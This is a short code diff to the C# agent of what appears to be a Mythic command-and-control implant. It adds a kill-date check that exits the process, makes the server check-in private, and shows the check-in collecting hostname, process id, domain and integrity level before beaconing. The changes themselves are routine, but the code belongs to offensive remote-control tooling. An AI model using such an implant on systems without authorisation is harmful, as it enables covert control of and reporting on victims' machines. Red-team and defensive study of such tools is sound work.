@@ -29,6 +29,10 @@ namespace Agent
         }
         public async Task Start()
         {
+            if (!this.CheckKillDate())
+            {
+                Environment.Exit(0);
+            }
             await this.CheckIn();
             await this._profile.StartBeacon();
         }
@@ -47,7 +51,7 @@ namespace Agent
         /// <summary>
         /// Performa  check-in with the Mythic server
         /// </summary>
-        public async Task<bool> CheckIn()
+        private async Task<bool> CheckIn()
         {
             Checkin ct = new Checkin()
             {
@@ -58,7 +62,7 @@ namespace Agent
                 host = Dns.GetHostName(),
                 pid = Process.GetCurrentProcess().Id,
                 uuid = this.config.uuid,
-                architecture = await Misc.GetArch(),
+                architecture = Misc.GetArch(),
                 domain = Environment.UserDomainName,
                 integrity_level = tokenManager.getIntegrity(),
             };
@@ -125,6 +129,11 @@ namespace Agent
             {
                 this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
             }
+        }
+        //Is this correct?
+        private bool CheckKillDate()
+        {
+            return DateTime.Now < this.config.killDate;
         }
     }
 }
